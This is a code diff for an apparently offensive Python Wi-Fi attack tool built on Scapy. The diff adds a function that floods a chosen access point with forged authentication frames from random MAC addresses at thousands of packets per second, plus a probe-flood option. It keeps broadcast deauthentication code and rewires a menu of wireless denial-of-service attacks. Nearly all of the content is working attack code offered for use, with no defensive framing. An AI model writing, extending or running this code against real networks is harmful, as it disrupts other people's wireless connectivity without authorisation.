@@ -24,7 +24,7 @@ from debugs import debug
 class AttackModule:
     def __init__(self):
         pass
-    def deauth_all(self, access_point, interface):
+    def deauth_all(access_point, interface):
         packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", 
                         addr2=access_point,
                         addr3=access_point)/ Dot11Deauth(reason=7)
@@ -41,6 +41,59 @@ class AttackModule:
                 time.sleep(0.1)
                 break
     
+    def auth_dos(interface, target_bssid, channel, pps=10000, duration=0):
+        duration_label = 'infinite' if duration <= 0 else f'{duration}s'
+        debug("info", f"[*] Authentication DoS Attack")
+        debug("info", f"[*] Target: {target_bssid} | Channel: {channel}")
+        debug("info", f"[*] Speed: {pps} pps | Duration: {duration_label}")
+        
+        # Set channel
+        os.system(f"iw dev {interface} set channel {channel}")
+        time.sleep(0.5)
+        
+        debug("info", "[*] Flooding with authentication requests...")
+        
+        sent = 0
+        start_time = time.time()
+        
+        try:
+            while duration <= 0 or time.time() - start_time < duration:
+                # Generate random client MAC
+                client_mac = "02:%02x:%02x:%02x:%02x:%02x" % (
+                    random.randint(0, 255), random.randint(0, 255),
+                    random.randint(0, 255), random.randint(0, 255),
+                    random.randint(0, 255)
+                )
+                
+                packet = RadioTap() / Dot11(
+                    type=0,
+                    subtype=11,
+                    addr1=target_bssid,
+                    addr2=client_mac,
+                    addr3=target_bssid
+                ) / Dot11Auth(
+                    algo=0,
+                    seqnum=1,
+                    status=0
+                )
+                
+                # Send burst
+                sendp(packet, iface=interface, count=100, inter=0, verbose=0)
+                sent += 100
+                
+                # Progress
+                if sent % 10000 == 0:
+                    elapsed = time.time() - start_time
+                    rate = sent / elapsed if elapsed > 0 else 0
+                    debug("info", f"[*] Sent: {sent} ({rate:.0f} pps)")
+            
+            if duration > 0:
+                elapsed = time.time() - start_time
+                debug("ok", f"[+] Attack complete! Sent {sent} packets in {elapsed:.1f}s")
+            
+        except KeyboardInterrupt:
+            debug("info", f"\n[!] Stopped. Sent {sent} packets")
+
     def access_point_flood(self, interface, count=200):
         noise_chars = string.punctuation
         supported_rates = b'\x82\x84\x8b\x96'
@@ -140,8 +193,20 @@ class AttackModule:
             
         except KeyboardInterrupt:
             debug("info", f"Attack Ended by user. Total packets sent: {sent}")
-
-
+    
+    def probe_dos(interface, channel):
+        pps = input("Packets per second (default 1000): ").strip()
+        try:
+            pps = int(pps) if pps else 1000
+        except ValueError:
+            debug("warn", "Invalid input for pps, using default 1000")
+            pps = 1000
+        from core.probe_flood import probe_dos
+        debug("info", f"Starting Probe Flood DoS with {pps} pps... Press Ctrl+C to stop.")
+        try:
+            probe_dos(interface, channel, pps)
+        except KeyboardInterrupt:
+            debug("info", "Probe Flood DoS interrupted by user")
 class ModuleSetup:
     def __init__(self):
         self.networks = {}
@@ -352,25 +417,21 @@ class ModuleSetup:
             print(f"\nAttack Modes Available:")
             print("1. Authentication Denial of Service")
             print("2. Michael Countermeasures DoS")
-            print("3. Packet Fuzzer Attack")
+            print("3. Probe Flood DoS")
             print("4. Deauth Denial of Service")
-            print("5. Other Attacks")
             print("0. Exit")
             atkmode = input("\nAttack Mode: ")
 
             if atkmode == "0":
                 break
             elif atkmode == "1" or atkmode.lower() == "authentication denial of service":
-                os.system(f"mdk4 {self.interface} a -m -s 10000 -a {chosen_bssid}")
+                AttackModule.auth_dos(self.interface, chosen_bssid, channel)
             elif atkmode == "2" or atkmode.lower() == "michael countermeasures dos":
                 AttackModule.michael_mic_dos(self.interface, chosen_bssid, channel)
-                #os.system(f"mdk4 {self.interface} m -w 0 -n 850000 -s 100000 -t {chosen_bssid}")
-            elif atkmode == "3" or atkmode.lower() == "packet fuzzer attack":
-                channel = input("Channel to attack, 'h' for hop: ")
-                debug("info", "Starting...")
-                os.system(f"mdk4 {self.interface} f -s abcp -m n -p 24500 -c {channel}")
+            elif atkmode == "3" or atkmode.lower() == "probe flood dos":
+                AttackModule.probe_dos(self.interface, channel)
             elif atkmode == "4" or atkmode.lower() == "deauth denial of service":
-                AttackModule.deauth_all(self, chosen_bssid, self.interface)
+                AttackModule.deauth_all(chosen_bssid, self.interface)
     def run(self):
         try:
             signal.signal(signal.SIGINT, self.signal_handler)
@@ -392,7 +453,6 @@ class ModuleSetup:
             elif mode == "2" or mode.lower() == "other attacks":
                 banner.other_attacks()
                 print("1. Network Flood")
-                print("2. WIDS Confusion")
                 print("0. Back")
                 others = input("\nAttack Mode: ").strip()
 
@@ -407,7 +467,7 @@ class ModuleSetup:
             debug("info", "Scanning for networks using DUAL BAND mode...")
             debug("info", "Starting channel hopping... Press Ctrl+C to stop.")
             debug("info", "If no networks appear after 30 seconds, press Ctrl+C and check your interface")
-            
+            time.sleep(2)
             self.start_channel_hop_scan()
             
             debug("info", "All networks found:")
